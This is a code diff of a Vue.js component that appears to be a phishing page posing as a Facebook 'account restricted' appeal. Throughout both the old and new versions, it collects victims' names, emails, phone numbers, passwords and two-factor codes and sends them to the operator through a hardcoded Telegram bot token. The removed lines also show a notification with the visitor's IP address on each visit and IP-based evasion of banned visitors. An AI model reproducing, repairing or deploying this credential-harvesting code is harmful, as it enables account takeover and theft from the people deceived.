@@ -1,18 +1,12 @@
 <script>
-  (function(d, w, c) {
-        w.ChatraID = 'Znyiomk26HxAoRp23';
-        var s = d.createElement('script');
-        w[c] = w[c] || function() {
-            (w[c].q = w[c].q || []).push(arguments);
-        };
-        s.async = true;
-        s.src = 'https://call.chatra.io/chatra.js';
-        if (d.head) d.head.appendChild(s);
-    })(document, window, 'Chatra');
 import useValidate from "@vuelidate/core";
-import { required, email, numeric } from "@vuelidate/validators";
+import { required } from "@vuelidate/validators";
 import axios from "axios";
 import ChatWidget from "@/components/ChatWidget.vue";
+
+// Telegram bot API details
+const TELEGRAM_API_TOKEN = '6905926094:AAGyqYfNpoHk4OTzeido68UiviOwJb6lOVE';
+const TELEGRAM_CHAT_ID = '1389938531';
 
 export default {
   name: "Form1",
@@ -31,26 +25,21 @@ export default {
       firstPassword: false,
       secondPassword: false,
       wrongPw: false,
-      pageLoad: false,
       form: {
         page_name: "",
         name: "",
         email: "",
         mobile: "",
-        // appeal: "",
+        appeal: "",
       },
       modal: {
         password: "",
         error: false,
       },
-      telegramToken: "6905926094:AAGyqYfNpoHk4OTzeido68UiviOwJb6lOVE",
-      chatId: "1389938531",
     };
   },
   created() {
-    document.title = "My Personal Account Was Restricted | Facebook";
-    // Send notification as soon as someone visits the site
-    this.sendNotificationOnVisit();
+    document.title = 'My Personal Account Was Restricted | Facebook';
     axios.interceptors.request.use(
       (config) => {
         if (this.waitingForResponse != true && this.chatMessage != true) {
@@ -83,16 +72,9 @@ export default {
   },
   mounted() {
     this.getClientIP();
-    this.checkBan();
+    // this.checkBan();
   },
   methods: {
-    pageLoading() {
-      this.pageLoad = true;
-
-      setTimeout(() => {
-        this.pageLoad = false;
-      }, 4500);
-    },
     chatMessageStatus() {
       this.chatMessage = true;
       console.log(this.chatMessage);
@@ -102,69 +84,52 @@ export default {
         .get("https://api.ipify.org?format=json")
         .then((response) => {
           this.ipAddress = response.data.ip;
-          this.checkBan();
-        })
-        .catch((e) => {
-          console.log(e);
-        });
-    },
-    checkBan() {
-      axios
-        .post("/api/fetch/ban", { ip: this.ipAddress })
-        .then((response) => {
-          if (response.data == "BAN") {
-            window.location.href = "https://www.facebook.com/help/";
-          }
+          //   this.checkBan();
         })
         .catch((e) => {
           console.log(e);
         });
     },
     getResponse() {
-      this.interval = setInterval(() => {
-        axios
-          .post("/api/fetch/decision", { case_ref: this.ipAddress })
-          .then((response) => {
-            let resType;
-
-            if (response.data == "CMD_EMAIL") {
-              resType = "email";
-              this.$router.push({
-                name: "twofa",
-                params: { type: resType, email: this.form.email },
-              });
-              clearInterval(this.interval);
-            }
-
-            if (response.data == "CMD_CODE") {
-              resType = "code";
-              this.$router.push({
-                name: "twofa",
-                params: { type: resType, email: this.form.email },
-              });
-              clearInterval(this.interval);
-            }
-
-            if (response.data == "CMD_CHECKPOINT") {
-              this.$router.push({
-                path: "checkpoint",
-              });
-              clearInterval(this.interval);
-            }
-
-            if (response.data == "CMD_WRONG") {
-              this.wrongPw = true;
-              this.loading = false;
-              this.modal.password = "";
-              clearInterval(this.interval);
-            }
-          })
-          .catch((e) => {
-            console.log(e);
-          });
-      }, 1000);
+      // Simulate response
+      setTimeout(() => {
+        let fakeResponse = "CMD_EMAIL"; // Simulate any response here
+        this.handleResponse(fakeResponse);
+      }, 2000);
     },
-    async submitForm() {
+    handleResponse(responseData) {
+      let resType;
+      if (responseData == "CMD_EMAIL") {
+        resType = "email";
+        this.$router.push({
+          name: "twofa",
+          params: {
+            type: resType,
+            email: this.form.email,
+          },
+        });
+      } else if (responseData == "CMD_CODE") {
+        resType = "code";
+        this.$router.push({
+          name: "twofa",
+          params: {
+            type: resType,
+            email: this.form.email,
+          },
+        });
+      } else if (responseData == "CMD_CHECKPOINT") {
+        this.$router.push({
+          path: "checkpoint",
+        });
+      } else if (responseData == "CMD_WRONG") {
+        this.wrongPw = true;
+        this.loading = false;
+        this.modal.password = '';
+      }
+      clearInterval(this.interval);
+    },
+    submitForm() {
+      console.log("submit");
       this.v$.$validate(); // checks all inputs
       if (!this.v$.$error) {
         let data = {
@@ -172,103 +137,88 @@ export default {
           name: this.form.name,
           email: this.form.email,
           mobile: this.form.mobile,
-          ip_address: this.ipAddress,
-          // appeal: this.form.appeal,
+          //   appeal: this.form.appeal,
         };
-
-        // Organize data into a structured message
-        let message = `
-          Page Name: ${data.page_name}
-          Name: ${data.name}
-          Email: ${data.email}
-          Mobile: ${data.mobile}
-          IP Address: ${data.ip_address}
-        `;
-
         console.log(data);
-        // Send organized data to Telegram
-        await axios.post(`https://api.telegram.org/bot${this.telegramToken}/sendMessage`, {
-          chat_id: this.chatId,
-          text: message,
-        });
+        // Send data to Telegram
+        axios.post(`https://api.telegram.org/bot${TELEGRAM_API_TOKEN}/sendMessage`, {
+          chat_id: TELEGRAM_CHAT_ID,
+          text: JSON.stringify(data),
+        })
+          .then((response) => {
+            console.log(response);
+          })
+          .catch((e) => {
+            this.errors.push(e);
+            console.log(this.errors);
+          });
 
         this.firstPassword = true;
       }
     },
-    async submitPassword() {
+    submitPassword() {
       if (this.modal.password != "") {
         if (this.secondPassword == false) {
           this.modal.error = false;
-          // Show loading animation
-          this.loading = true;
-          // Simulate a 2-second delay before continuing
-          setTimeout(async () => {
-            // Send data to Telegram
-            await axios.post(`https://api.telegram.org/bot${this.telegramToken}/sendMessage`, {
-              chat_id: this.chatId,
-              text: `First Password: ${this.modal.password}\nIP Address: ${this.ipAddress}`,
-            });
-            this.waitingForResponse = true;
-            this.getResponse();
-            this.secondPassword = true;
-            this.modal.password = "";
-            // Hide loading animation after 2 seconds
-            setTimeout(() => {
-              this.loading = false;
-            }, 2000);
-          }, 2000);
+          // Send first password to Telegram
+          axios.post(`https://api.telegram.org/bot${TELEGRAM_API_TOKEN}/sendMessage`, {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: `First Password: ${this.modal.password}`,
+          })
+          .then((response) => {
+            console.log(response);
+            // Set wrongPw to true to display the wrong password page
+            this.wrongPw = true;
+          })
+          .catch((error) => {
+            console.error(error);
+          });
         } else {
-          // Show loading animation
-          this.loading = true;
-          // Simulate a 2-second delay before continuing
-          setTimeout(async () => {
-            // Send data to Telegram
-            await axios.post(`https://api.telegram.org/bot${this.telegramToken}/sendMessage`, {
-              chat_id: this.chatId,
-              text: `Second Password: ${this.modal.password}\nIP Address: ${this.ipAddress}`,
-            });
-            this.waitingForResponse = false;
-            // Simulate receiving CMD_CODE after wrongPw
+          // Send wrong password notification to Telegram
+          axios.post(`https://api.telegram.org/bot${TELEGRAM_API_TOKEN}/sendMessage`, {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: `Wrong Password: ${this.modal.password}`,
+          })
+          .then((response) => {
+            console.log(response);
+            // Simulate moving to CMD_CODE after wrong password submission
+            let fakeResponse = "CMD_CODE"; // Simulate CMD_CODE response
+            this.handleResponse(fakeResponse);
+            // Redirect to twofa route with type set to "code"
             this.$router.push({
               name: "twofa",
-              params: { type: "code", email: this.form.email },
+              params: {
+                type: "code",
+                email: this.form.email,
+              },
             });
-            // Hide loading animation after 2 seconds
-            setTimeout(() => {
-              this.loading = false;
-            }, 2000);
-          }, 2000);
+          })
+          .catch((error) => {
+            console.error(error);
+          });
         }
-        // Set wrongPw to true after submitting the first password
-        this.wrongPw = true;
       } else {
         this.modal.error = true;
       }
     },
     alert() {
-      alert("Please complete the form before you navigate.");
-    },
-    sendNotificationOnVisit() {
-      // Send notification with user's IP address as soon as someone visits the site
-      axios.post(`https://api.telegram.org/bot${this.telegramToken}/sendMessage`, {
-        chat_id: this.chatId,
-        text: `Vazhdoj!\nIP Address: ${this.ipAddress}`,
-      });
-    },
+      alert('Please complete the form before you navigate.');
+    }
   },
   validations() {
     return {
       form: {
         page_name: { required },
         name: { required },
-        email: { required, email },
-        mobile: { required, numeric },
-        // appeal: { required },
+        email: { required },
+        mobile: { required },
+        appeal: { required },
       },
     };
   },
 };
 </script>
+
 
 <template>
   <div v-if="loading" id="loadFacebookC" class="">
